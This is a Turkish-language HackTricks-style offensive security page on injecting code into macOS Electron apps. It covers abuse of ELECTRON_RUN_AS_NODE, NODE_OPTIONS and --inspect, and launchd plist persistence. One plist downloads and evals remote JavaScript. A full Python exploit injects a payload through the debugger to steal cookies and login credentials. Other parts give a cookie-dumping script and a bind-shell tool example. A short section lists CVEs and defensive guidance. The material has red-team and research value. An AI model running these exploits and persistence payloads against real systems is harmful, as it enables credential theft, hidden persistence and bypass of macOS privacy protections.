# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Electron'ın ne olduğunu bilmiyorsanız [**burada pek çok bilgi bulabilirsiniz**](https://book.hacktricks.wiki/en/desktop-application-security/electron-desktop-apps/index.html#rce-xss--contextisolation). Şimdilik Electron'ın **node** çalıştırdığını bilmeniz yeterli.\
Node'un, belirtilen dosyanın dışında başka kodların da **çalıştırılmasını sağlayabilen** bazı **parametreleri** ve **env değişkenleri** vardır.

Platformlar arası yerel yazma ön koşulu ve ASAR/V8 snapshot yolları için bkz. [Electron local code injection and snapshot tampering](../../../desktop-application-security/electron-desktop-apps/electron-local-code-injection-and-snapshot-tampering.md).

### Electron Fuses

Bu teknikler sonraki bölümlerde ele alınacak, ancak son zamanlarda Electron bunları **önlemek için** çeşitli **güvenlik bayrakları** ekledi. Bunlar [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) olarak adlandırılır ve macOS'taki Electron uygulamalarının **keyfi kod yüklemesini önlemek** için kullanılanlar şunlardır:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Devre dışı bırakıldığında, kod enjekte etmek için **`ELECTRON_RUN_AS_NODE`** env değişkeninin kullanılmasını önler.
- **`EnableNodeCliInspectArguments`**: Devre dışı bırakıldığında, `--inspect` ve `--inspect-brk` gibi parametreler dikkate alınmaz. Böylece bu yöntemle kod enjekte edilmesi önlenir.
- **`EnableEmbeddedAsarIntegrityValidation`**: Etkinleştirildiğinde, yüklenen **`asar`** **dosyası** macOS tarafından **doğrulanır**. Böylece bu dosyanın içeriği değiştirilerek **kod enjekte edilmesi** önlenir.
- **`OnlyLoadAppFromAsar`**: Etkinleştirilirse, uygulama şu sırayla yüklenmek üzere aranmaz: **`app.asar`**, **`app`** ve son olarak **`default_app.asar`**. Yalnızca app.asar kontrol edilip kullanılır; böylece **`embeddedAsarIntegrityValidation`** fuse'u ile **birlikte kullanıldığında**, **doğrulanmamış kodun yüklenmesi** imkânsız hale gelir.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinleştirildiğinde, browser process V8 snapshot'ı için `browser_v8_context_snapshot.bin` adlı dosyayı kullanır.

Kod enjeksiyonunu önlemeyen başka ilginç bir fuse:

- **EnableCookieEncryption**: Etkinleştirildiğinde, diskteki cookie store işletim sistemi düzeyindeki kriptografik anahtarlarla şifrelenir.

### Electron Fuses'ı Kontrol Etme

Bu bayrakları bir uygulamadan şu şekilde **kontrol edebilirsiniz**:

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### Electron Fuses'ı Değiştirme

[**Dokümanlarda belirtildiği**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode) gibi, **Electron Fuses** yapılandırması, içinde bir yerde **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** dizesini içeren **Electron binary** içinde bulunur.<sup>[[1]](#references)</sup>

macOS uygulamalarında bu genellikle `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` konumundadır.

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

Bu dosyayı [https://hexed.it/](https://hexed.it/) üzerinde açıp önceki dizeyi arayabilirsiniz. Bu dizenin ardından, her fuse'un devre dışı mı yoksa etkin mi olduğunu belirten ASCII biçiminde bir "0" veya "1" görürsünüz. **Fuse değerlerini değiştirmek** için hex kodunu (`0x30`, `0` ve `0x31`, `1` anlamına gelir) değiştirmeniz yeterlidir.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Değiştirilmiş bu baytlarla bir uygulamadaki **`Electron Framework` binary** dosyasının üzerine yazmaya çalışırsanız uygulamanın çalışmayacağını unutmayın.

## Electron Uygulamalarına Kod Ekleyerek RCE

Bir Electron App'in kullandığı **harici JS/HTML dosyaları** olabilir. Bu nedenle bir attacker, imzası denetlenmeyecek olan bu dosyalara kod enjekte ederek uygulama bağlamında rastgele kod çalıştırabilir.

> [!CAUTION]
> Ancak şu anda 2 sınırlama vardır:
>
> - Bir App'i değiştirmek için **`kTCCServiceSystemPolicyAppBundles`** izni **gerekir**; bu nedenle varsayılan olarak artık mümkün değildir.
> - Derlenmiş **`asap`** dosyasında genellikle **`embeddedAsarIntegrityValidation`** ve **`onlyLoadAppFromAsar`** fuse'ları **etkindir**.
>
> Bu da bu saldırı yolunu daha karmaşık (veya imkânsız) hâle getirir.

Uygulamayı başka bir dizine (örneğin **`/tmp`**) kopyalayarak, **`app.app/Contents`** klasörünü **`app.app/NotCon`** olarak yeniden adlandırarak, **asar** dosyasını **kötü amaçlı** kodunuzla **değiştirerek**, klasörün adını yeniden **`app.app/Contents`** olarak değiştirerek ve uygulamayı çalıştırarak **`kTCCServiceSystemPolicyAppBundles`** gereksinimini atlamanın mümkün olduğunu unutmayın.<sup>[[5]](#references)</sup>

asar dosyasındaki kodu şu şekilde açabilirsiniz:

```bash
npx asar extract app.asar app-decomp
```

Ve değiştirdikten sonra şu araçla yeniden paketleyin:

```bash
npx asar pack app-decomp app-new.asar
```

## ELECTRON_RUN_AS_NODE ile RCE

[**Belgelere**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) göre, bu env değişkeni ayarlanırsa süreç normal bir Node.js süreci olarak başlatılır.<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> **`RunAsNode`** fuse'u devre dışı bırakılırsa **`ELECTRON_RUN_AS_NODE`** env var'ı yok sayılır ve bu yöntem işe yaramaz.

### App Plist'inden Injection

[**Burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), persistence sağlamak için bir plist'te bu env variable'ı abuse edebilirsiniz:<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## RCE with `NODE_OPTIONS`

Payload'ı farklı bir dosyada saklayıp çalıştırabilirsiniz:

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> **`EnableNodeOptionsEnvironmentVariable`** fuse'u **devre dışıysa**, uygulama başlatıldığında **`ELECTRON_RUN_AS_NODE`** env variable'ı ayarlanmadığı sürece **NODE_OPTIONS** env var'ını **yok sayar**. **`RunAsNode`** fuse'u devre dışıysa **`ELECTRON_RUN_AS_NODE`** da **yok sayılır**.
>
> **`ELECTRON_RUN_AS_NODE`** ayarlanmazsa şu **hatayı** görürsünüz: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App Plist üzerinden Injection

Bu env variable'ı plist dosyasında kötüye kullanarak şu anahtarları ekleyip persistence sağlayabilirsiniz:

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## Inspect ile RCE

[**Bu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kaynağa göre, bir Electron uygulamasını **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi flag'lerle çalıştırırsanız, bağlanabileceğiniz bir **debug port açılır** (örneğin Chrome'da `chrome://inspect` üzerinden) ve bu porta **code inject edebilir** veya hatta yeni process'ler başlatabilirsiniz.<sup>[[7]](#references)</sup>\
Örneğin:

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

[**bu blog yazısında**](https://hackerone.com/reports/1274695), bu debugging kötüye kullanılarak headless Chrome'a **istenen konumlara istenen dosyaları indirtildi**.<sup>[[8]](#references)</sup>

> [!TIP]
> Bir uygulamanın `--inspect` gibi env değişkenlerinin veya parametrelerin ayarlanıp ayarlanmadığını kontrol etmek için kendi yöntemi varsa, uygulama başlarken yürütmeyi **durduran** ve bir bypass gerçekleştiren `--inspect-brk` argümanını kullanarak bu kontrolü runtime'da **bypass** etmeyi deneyebilirsiniz (örneğin, mevcut process'in argümanlarını veya env değişkenlerini üzerine yazarak).

Aşağıdaki exploit'te, uygulama `--inspect-brk` parametresiyle izlenip çalıştırılarak sahip olduğu özel korumanın bypass edilmesi (process parametrelerinin üzerine yazılıp `--inspect-brk`'in kaldırılması) ve ardından uygulamadaki cookie'leri ve kimlik bilgilerini dışarı aktarmak için bir JS payload'ı enjekte edilmesi mümkün oldu:

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> **`EnableNodeCliInspectArguments`** fuse'u devre dışıysa, env variable **`ELECTRON_RUN_AS_NODE`** ayarlanmadığı sürece uygulama başlatıldığında node parametrelerini (ör. `--inspect`) **yok sayar**. **`RunAsNode`** fuse'u devre dışıysa, env variable da **yok sayılır**.
>
> Ancak **`--remote-debugging-port=9229`** electron parametresini kullanmaya devam edebilirsiniz; fakat önceki payload diğer process'leri çalıştırmak için işe yaramaz.

**`--remote-debugging-port=9222`** parametresini kullanarak Electron App'ten **geçmiş** gibi bazı bilgileri (GET komutlarıyla) veya tarayıcının **cookie**'lerini (tarayıcı içinde **şifreleri çözüldüğü** ve bunları sağlayan bir **json endpoint** bulunduğu için) çalmak mümkündür.

Bunu nasıl yapacağınızı [buradan](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [buradan](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) öğrenebilir ve [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) otomatik aracını ya da aşağıdaki gibi basit bir script'i kullanabilirsiniz:<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### App Plist'inden Injection

Persistence sağlamak için bir plist dosyasına şu key'leri ekleyerek bu env variable'dan yararlanabilirsiniz:

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## Eski Sürümleri Kötüye Kullanarak TCC Bypass

> [!TIP]
> macOS’un TCC daemon’ı uygulamanın çalıştırılan sürümünü denetlemez. Dolayısıyla, önceki tekniklerden herhangi biriyle **bir Electron uygulamasına code inject edemiyorsanız**, uygulamanın önceki bir sürümünü indirip içine code inject edebilirsiniz; Trust Cache bunu engellemediği sürece uygulama TCC izinlerini almaya devam eder.

## JS Olmayan Code Çalıştırma

Önceki teknikler, **Electron uygulamasının process’i içinde JS code çalıştırmanıza** olanak tanır. Ancak **child process’lerin parent uygulamayla aynı sandbox profile altında çalıştığını** ve **TCC izinlerini devraldığını** unutmayın.\
Bu nedenle, örneğin camera veya microphone’a erişmek için entitlements’ı kötüye kullanmak istiyorsanız, **process içinden başka bir binary çalıştırmanız** yeterlidir.

## Dikkat Çeken Electron macOS Zafiyetleri (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 ve çeşitli 23-27 pre-release sürümleri, `.app/Contents/Resources` klasörüne yazma erişimi olan bir saldırganın `embeddedAsarIntegrityValidation` **ve** `onlyLoadAppFromAsar` fuses’larını bypass etmesine olanak tanıyordu. Hata, integrity checker’daki bir *file-type confusion* sorunuydu. Bu sorun, doğrulanmış archive yerine **`app.asar` adlı bir directory’nin** yüklenmesine yol açıyordu; dolayısıyla bu directory içine yerleştirilen JavaScript, uygulama başlatıldığında çalıştırılıyordu. Bu nedenle, hardening yönergelerini izleyip her iki fuse’u da etkinleştiren vendor’lar bile macOS’ta hâlâ zafiyet altındaydı.<sup>[[3]](#references)</sup>

Yama içeren Electron sürümleri: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** ve **27.0.0-alpha.7**. Daha eski bir build çalıştıran uygulama bulan saldırganlar, uygulamanın TCC entitlements’larıyla code çalıştırmak için `Contents/Resources/app.asar` dosyasını kendi directory’leriyle değiştirebilir.<sup>[[3]](#references)</sup> 

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE kümesi

Ocak 2024’te bir dizi CVE (CVE-2024-23738 ile CVE-2024-23743 arası), birçok Electron uygulamasının **RunAsNode** ve **EnableNodeCliInspectArguments** fuses’ları hâlâ etkin olarak dağıtıldığını ortaya koydu. Bu nedenle yerel bir saldırgan, programı `ELECTRON_RUN_AS_NODE=1` environment variable’ıyla veya `--inspect-brk` gibi flag’lerle yeniden başlatarak onu *generic* bir Node.js process’ine dönüştürebilir ve uygulamanın tüm sandbox ve TCC izinlerini devralabilir.<sup>[[4]](#references)</sup>

Electron ekibi “critical” derecelendirmesine itiraz etmiş ve saldırganın zaten yerel code execution elde etmiş olması gerektiğini belirtmiş olsa da, bu sorun post-exploitation sırasında hâlâ işe yarar; çünkü savunmasız herhangi bir Electron bundle’ını, örneğin masaüstü uygulamasına daha önce verilmiş izinlerle Contacts, Photos veya diğer hassas kaynakları okuyabilen bir *living-off-the-land* binary’sine dönüştürür.<sup>[[4]](#references)</sup>

Electron maintainer’larının savunma yönergeleri:<sup>[[4]](#references)</sup>

* Production build’lerinde `RunAsNode` ve `EnableNodeCliInspectArguments` fuses’larını devre dışı bırakın.
* Uygulamanızın gerçekten bir yardımcı Node.js process’ine ihtiyacı varsa, bu fuses’ları yeniden etkinleştirmek yerine yeni **UtilityProcess** API’sini kullanın. 

## Otomatik Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) aracı, yüklü **savunmasız electron uygulamalarını bulmak** ve bunlara code inject etmek için kolayca kullanılabilir. Bu araç **`--inspect`** tekniğini kullanmayı dener:<sup>[[5]](#references)</sup>

Aracı kendiniz derlemeniz gerekir; şu şekilde kullanabilirsiniz:

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki, Electron uygulamalarını backdoor'lamak için tasarlandı. Bunun için uygulamaların JavaScript dosyalarını Loki Command & Control JavaScript dosyalarıyla değiştiriyordu.

## References

- [1] [Electron Fuse'ları](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Üçüncü Taraf Framework'leri Aracılığıyla macOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Dosya türü karışıklığı aracılığıyla ASAR Integrity bypass (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] ['runAsNode' CVE'leri hakkında açıklama - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - macOS Gizliliğini ELECTRONlaştırmak - Red Team cephaneliğinizde yeni bir silah - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Ortam Değişkenleri | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electron uygulamaları sırlarınızı neden gizli saklayamaz: --inspect seçeneği](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Raporu #1274695 - Electron debugging, istenen dosyaların indirilmesi için kötüye kullanıldı](https://hackerone.com/reports/1274695)
- [9] [Cookie Kavanozunda Eller: Chromium'un Remote Debugger Port'u ile Cookie'leri Dump Etme - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Chromium'un Remote Debugger'ı ile Cookie Dumping Hatalarını Ayıklama - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
